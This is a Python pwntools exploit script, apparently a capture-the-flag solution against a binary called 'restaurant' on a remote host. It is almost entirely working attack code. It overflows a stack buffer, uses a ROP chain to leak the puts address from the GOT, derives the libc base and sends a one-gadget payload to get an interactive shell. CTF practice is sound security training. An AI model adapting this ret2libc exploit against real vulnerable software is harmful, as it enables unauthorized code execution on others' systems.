#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time
import binascii

context.update(arch='amd64')
exe = './restaurant'
HOST = '138.68.131.63'
PORT = 31916
elf = ELF(exe)

if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF("./libc.so.6") #libc 2.27

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
b *0x0000000000400eec
'''.format(**locals())

p = start()
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")

log.info(f"overflow index: 40")

pad_len = 40
payload = b"A" * pad_len
payload += p64(0x4010a3)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['fill'])

log.info("sending leak payload")
p.sendline(payload)
print(p.recvuntil(b'A'*40))

puts_leak = u64(p.recvline()[3:9].ljust(8,b"\x00"))
print(hex(puts_leak))
if not args.REMOTE:
    libc.address = puts_leak - 0x080d90
else:
    libc.address = puts_leak - 0x080aa0
log.info(f"libc base @ {hex(libc.address)}")
log.info(f"one_gadget @ {hex(libc.address + 0x0e6c81)}")

payload = b"A" * pad_len
if not args.REMOTE:
    payload += p64(libc.address + 0xdf54f)
else:
    payload += p64(libc.address + 0x10a41c)
payload += b"\x00"*32
log.info("sending one gadget payload")
p.sendline(payload)
p.interactive()

